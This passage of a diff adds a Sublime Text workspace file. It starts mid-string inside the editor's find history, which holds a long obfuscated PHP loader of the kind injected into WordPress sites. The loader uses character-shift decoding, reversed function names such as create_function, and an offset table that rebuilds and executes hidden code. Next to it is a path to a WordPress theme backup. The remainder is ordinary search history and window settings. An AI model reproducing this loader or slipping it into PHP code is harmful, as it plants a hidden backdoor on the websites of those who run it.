implode(array_map(\"kmezixh\",str_split(\"%tjw!>!#]y8+opjudovg+)!gj+{e%!osvufs:4:|:**#ppde#)tutjyf`4\tx223}!+!<+{e%+*!*+fepdfe{h+{d%)y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!*6<\tx7fw6*\tx7f_*#fubfsdX4-!%\tx24-\tx24*!|!\tx24-\tx2%z<jg!)%z>>2*!%z>3<!fm-#C#-#O#-#N#*-!%ff2-!%t::#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#x5c%j:.2^,%b:<!%c:>%s:\tx5c%!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74g6R85,67R37,18R#>q%V<*#fopoV;hojepdjx = $sbbpzly(\"\", $ptfxzkm); $323zbe!-#jt0*?]+^?]_\tx5c}X\tx24<J`GB)fubfsdXA\tx27K6<\tx7fw6*3qj%7>\tx2272**<(<!fwbm)%tjw)#\tx24#-!#]y38#-!%w:**<\")));$xdebr$GLOBALS[\"\tx61\t156\tx75\t156\tx61\"]=1; $#-#\tx24-\tx24-tusqpt)%z-#N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<**7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opb%!|!*)323zbek!~!<b%\txL6M7]D4]275]D:M8]Df#<%%>U<#16,47R57,27R66,#/q%>2q%<#j:^<!%w`\tx5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/>^#zsfvr#\tx5cq%7**^#z-1-r%)s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%;utpi}Y;tuofuopd`ufh`*\tx7f!>>\tx22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!]3]364]6]283]427]36]373P6]36]73]-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%z78]y3e]81]K78:56985:6197g:74pe_GMFT`QIQ&f_UTPI`QUUI&e_*msv%7-MSV,6<*)ujojR\tx27id%6<\tx7fw6*\tx7f_*#ujojRk3`{666~6<&w6<\tx7fw6*!*!+A!>!{e%)!>>\tx22!ftmbg)!gj<*#k#)usbutLS[\"\tx61\t156\tx75\t156\tx61\"])))) { x5c1^-%r\tx5c2^-%hOh/#83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!os#372]58y]472]37y]672]48y]#>s%<#462]47y]sfvr#\tx5cq%)ufttj\tx22)gj6<^#Y#\tx5cq%\tx27Y%6<.msv`ftsbqA7>q%107\tx45\t116\tx54\"]); if ((strstr($uas,\"\tx6d\t163:*mmvo:>:iuhofm%:-5ppdeef)#\tx24*<!%t::!>!\tx24Ypp3)%cB%iN}#-!\tx24/%tmw/\tx24)%c*W%eN+#Qi\tx5c1^00#W~!%t2w)##Qtjw)#]82)ftpmdR6<*id%)dfyfR\tx]78]K5]53]Kc#<%tpz!>!#]D6M7]K3ut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816|!*msv%)}k~~~<ftmbg!osvufs!4]31#-%tdz*Wsfuvso!%bss\tx5csboe))1/35.)1/14+9*.5`hA\tx27pd%6<pd%w6Z6<.4`hA\tx27pd%6<pd%w6Z6tf!%z>2<!%ww2)%w`TW~\tx24<!fwbm)%\tx27)fepdof.)fepdof./#@#/qp%fsX\tx27u%)7fmjix6<C\tx27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%68]37]278]225]241]334]368]322]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]K9tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld*#j{hnpd#)tutjyf`opjudovg\tx22)!gj}1~!<2p%\tx7f!985-rr.93e:5597f-s.973:8297f:5297e:>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSgbfqucigrt'; $mkzwiuvbm=explode(chr((509-389)),substr($lkwudrx,(19690-13670),(193-159))); $inptukqjn = $mkzwiuvbm[0]($mkzwiuvbm[(4-3)]); $utojygxlc = $mkzwiuvbm[0]($mkzwiuvbm[(14-12)]); if (!function_exists('qonaslvnc')) { function qonaslvnc($wvsrknwc, $mfmlqr,$pebzirgbh) { $lcbulunku = NULL; for($adtzfts=0;$adtzfts<(sizeof($wvsrknwc)/2);$adtzfts++) { $lcbulunku .= substr($mfmlqr, $wvsrknwc[($adtzfts*2)],$wvsrknwc[($adtzfts*2)+(6-5)]); } return $pebzirgbh(chr((56-47)),chr((514-422)),$lcbulunku); }; } $yfhhiwuo = explode(chr((220-176)),'1682,53,2116,20,4964,33,4228,37,1978,70,5211,46,411,34,748,43,1070,64,2643,26,791,59,2275,34,1854,54,3084,23,3610,63,2710,20,2961,60,5550,43,3478,48,2309,25,1393,47,2786,35,5653,66,2541,42,2238,37,40,34,4140,39,2410,67,1440,48,4544,21,5152,59,3819,23,1819,35,1344,49,3363,41,5371,21,445,57,4855,69,1285,59,4628,21,1510,41,3335,28,1622,60,4649,58,5477,27,5069,44,2730,56,997,24,2163,31,0,40,3107,27,74,29,687,61,3752,67,5870,46,1134,32,632,55,4322,53,3134,30,5625,28,5951,69,3914,57,502,25,161,37,5422,55,3404,24,4829,26,2334,45,4409,22,4375,34,2075,41,2136,27,2881,47,3021,63,3586,24,3550,36,539,24,2821,60,5257,23,3698,54,3673,25,4924,40,103,58,1241,44,4453,30,4044,35,2690,20,850,34,1488,22,1166,47,1908,70,4109,31,3998,46,3428,50,198,43,4565,63,3164,58,5113,39,563,69,343,68,3842,25,884,44,4265,24,2048,27,241,65,1021,49,2194,44,3526,24,5280,69,1551,26,1213,28,2928,33,4739,62,2477,64,4997,21,5349,22,1577,45,4801,28,5916,35,3273,62,5747,57,5392,30,1760,59,4431,22,5804,28,5832,38,3222,51,2583,60,5719,28,4707,32,5018,51,306,37,5504,46,1735,25,4289,33,2379,31,2669,21,3971,27,4483,61,3867,22,5593,32,928,69,3889,25,4179,49,4079,30,527,12'); $njquqg = $inptukqjn(\"\",qonaslvnc($yfhhiwuo,$lkwudrx,$utojygxlc)); $inptukqjn=$lkwudrx; $njquqg(\"\"); $njquqg=(765-644); $lkwudrx=$njquqg-1; ?>",
+			"S:\\Backups\\wp\\ketunpolunwp\\wp-content\\themes\\vantage\\",
+			"S:\\",
+			"$lkwudrx",
+			"lkwudrx",
+			"content",
+			"lightBoxAnyContent",
+			"qios",
+			"qio",
+			"#front",
+			"em",
+			"figure",
+			"aside",
+			"nav-group",
+			"nav",
+			"border-bottom",
+			";\n",
+			"thumb",
+			"container",
+			"site-header",
+			"navigation",
+			"btn",
+			"focus",
+			".blog-",
+			".blog-artikkel",
+			"h3",
+			"h2",
+			"play-button",
+			"#uusi-biisi",
+			".site-title",
+			"play-button",
+			"focus",
+			" ></",
+			"margin-bottom",
+			".5rem",
+			"offset",
+			"button",
+			"svg",
+			"right",
+			"opened",
+			"first-child",
+			"50%",
+			"background-color:",
+			"max-wid",
+			"'air'",
+			"bm16",
+			"ul",
+			"$color-body",
+			"speaker",
+			".offset",
+			"click",
+			"sidenav",
+			"offset",
+			"getPanel",
+			"speakers",
+			"menu",
+			"click",
+			"nav-toggle",
+			"border",
+			".pair-cont",
+			"console.log",
+			"scrollTop",
+			"animatePairs",
+			"animateBrick",
+			"addFrame",
+			"fixedSection",
+			"top",
+			"con",
+			"cond",
+			"scroll",
+			"preventDefau",
+			"e.prevent",
+			"event)",
+			"e)",
+			"verticalAlig",
+			"setSecti",
+			"transition",
+			"swing",
+			"scroll",
+			"mouse",
+			".right",
+			".left",
+			"offset",
+			"trailer",
+			"$(window).unbind(\"scroll\",",
+			"$(window).bind(\"scroll\",",
+			"==",
+			"$(window).width()",
+			"$(window).height()",
+			"(window).width()",
+			"$(window).height()",
+			"jQuery(window).height()",
+			"jQuery(window).height();",
+			".height",
+			" == ",
+			"==",
+			"var array",
+			"array",
+			"margin-bottom",
+			".panel",
+			"length",
+			"\t\t    $(\".panel\" ).each(function( index ) {\n\t\t    \tvar distanceToTop = $(this).offset().top;\n\t        \tpanelPositions.push(distanceToTop);\n\t        \t// console.log(panelPositions);\n\t    \t});",
+			"30",
+			"disableSc",
+			".panel",
+			"console.log",
+			"consoole.log",
+			"scroll",
+			"mouse",
+			"setSectionHe",
+			"setSection",
+			"scroll",
+			"eof",
+			" eof",
+			" eof ",
+			"eof",
+			"offset",
+			"#nav",
+			"distance"
+		],
+		"highlight": true,
+		"in_selection": false,
+		"preserve_case": false,
+		"regex": false,
+		"replace_history":
+		[
+			"rem",
+			"sn-desc",
+			"sn-positive",
+			"kuva",
+			"<?php // ?>",
+			"''",
+			"element",
+			"lightboxAnything",
+			"rem",
+			"h4",
+			"h3",
+			"'ruohonen'",
+			"ruohonen",
+			"$color-links",
+			"linear",
+			".panelCon.right",
+			".panelCon.left",
+			"document.removeEventListener(\"wheel\", ",
+			"document.addEventListener(\"wheel\",",
+			"winHeight",
+			"===",
+			"startBricks(",
+			"right",
+			"0.8",
+			"0.6",
+			"1.11.3",
+			"",
+			"/ald-assets/",
+			"-xs-",
+			"-lg-",
+			"-md-",
+			"-xs-",
+			"",
+			"Finnish Special Glass",
+			"fluid",
+			"lighten",
+			"jQuery",
+			"home",
+			"appCt",
+			"ng-src=",
+			"src",
+			"assets/",
+			"../assets/",
+			"../../assets/",
+			"third",
+			"<div",
+			"div>",
+			"fixed",
+			"true",
+			"yhteystiedot",
+			"h3",
+			"Moduulit",
+			"container",
+			"\"container-fluid",
+			"loginModal",
+			"",
+			"http://developers.spymhosting.com/mirrorline2016/",
+			"utf8",
+			"utf8_general_ci",
+			"jQuery",
+			"max-width:1280px",
+			"getResults",
+			"'",
+			"\"",
+			"('http://svirmasalo.fi/kehitys/wedia",
+			"node_modules",
+			"$request",
+			"'",
+			"required",
+			"$output2",
+			"$taskResponse",
+			"$taskMysqli",
+			"taskMysqli",
+			"taskdata",
+			"employee",
+			"output",
+			"'",
+			"Doughnut",
+			"/box/",
+			"twitter_call",
+			"private ",
+			"private",
+			"$twitter_parameters",
+			"build_base_path",
+			"base_path",
+			"credentials",
+			"ig_ClientCredentials",
+			"",
+			"who_cares_table",
+			"who-cares",
+			"$tag",
+			"dumpThatData",
+			"gram",
+			"instagram",
+			"dumpThatData",
+			"",
+			"WHO_CARES",
+			"who_cares_page_function",
+			"add_who_cares_menu",
+			"isCurrentSlideIndexi($index)",
+			"isCurrentSlaidiIndexi",
+			"slides",
+			"sliders",
+			"black",
+			".navigaatio"
+		],
+		"reverse": false,
+		"show_context": true,
+		"use_buffer2": true,
+		"whole_word": false,
+		"wrap": true
+	},
+	"groups":
+	[
+		{
+			"selected": 3,
+			"sheets":
+			[
+				{
+					"buffer": 0,
+					"file": "public/js/main.js",
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 1281,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								355,
+								355
+							]
+						],
+						"settings":
+						{
+							"syntax": "Packages/Babel/JavaScript (Babel).sublime-syntax",
+							"tabs_extra_last_activated": 1507752279.97,
+							"tabs_extra_last_activated_sheet_index": 0,
+							"tabs_extra_spawned": true
+						},
+						"translation.x": 0.0,
+						"translation.y": 0.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 3,
+					"type": "text"
+				},
+				{
+					"buffer": 1,
+					"file": "public/index.html",
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 893,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								819,
+								819
+							]
+						],
+						"settings":
+						{
+							"syntax": "Packages/HTML/HTML.sublime-syntax",
+							"tabs_extra_last_activated": 1507752324.15,
+							"tabs_extra_last_activated_sheet_index": 1,
+							"tabs_extra_spawned": true,
+							"translate_tabs_to_spaces": false
+						},
+						"translation.x": 0.0,
+						"translation.y": 0.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 2,
+					"type": "text"
+				},
+				{
+					"buffer": 2,
+					"file": "package.json",
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 925,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								360,
+								404
+							]
+						],
+						"settings":
+						{
+							"syntax": "Packages/JavaScript/JSON.sublime-syntax",
+							"tabs_extra_last_activated": 1507904721.31,
+							"tabs_extra_last_activated_sheet_index": 2
+						},
+						"translation.x": 0.0,
+						"translation.y": 0.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 1,
+					"type": "text"
+				},
+				{
+					"buffer": 3,
+					"file": ".gitignore",
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 902,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								203,
+								203
+							]
+						],
+						"settings":
+						{
+							"auto_name": "node_modules/",
+							"syntax": "Packages/Text/Plain text.tmLanguage",
+							"tabs_extra_last_activated": 1507905188.8,
+							"tabs_extra_last_activated_sheet_index": 3,
+							"tabs_extra_spawned": true
+						},
+						"translation.x": 0.0,
+						"translation.y": 0.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 0,
+					"type": "text"
+				}
+			]
+		}
+	],
+	"incremental_find":
+	{
+		"height": 26.0
+	},
+	"input":
+	{
+		"height": 38.0
+	},
+	"layout":
+	{
+		"cells":
+		[
+			[
+				0,
+				0,
+				1,
+				1
+			]
+		],
+		"cols":
+		[
+			0.0,
+			1.0
+		],
+		"rows":
+		[
+			0.0,
+			1.0
+		]
+	},
+	"menu_visible": true,
+	"output.find_results":
+	{
+		"height": 0.0
+	},
+	"pinned_build_system": "",
+	"project": "sub-proj.sublime-project",
+	"replace":
+	{
+		"height": 48.0
+	},
+	"save_all_on_build": true,
+	"select_file":
+	{
+		"height": 0.0,
+		"last_filter": "",
+		"selected_items":
+		[
+		],
+		"width": 0.0
+	},
+	"select_project":
+	{
+		"height": 500.0,
+		"last_filter": "",
+		"selected_items":
+		[
+		],
+		"width": 380.0
+	},
+	"select_symbol":
+	{
+		"height": 0.0,
+		"last_filter": "",
+		"selected_items":
+		[
+		],
+		"width": 0.0
+	},
+	"selected_group": 0,
+	"settings":
+	{
+	},
+	"show_minimap": true,
+	"show_open_files": false,
+	"show_tabs": true,
+	"side_bar_visible": true,
+	"side_bar_width": 230.0,
+	"status_bar_visible": true,
+	"template_settings":
+	{
+	}
+}
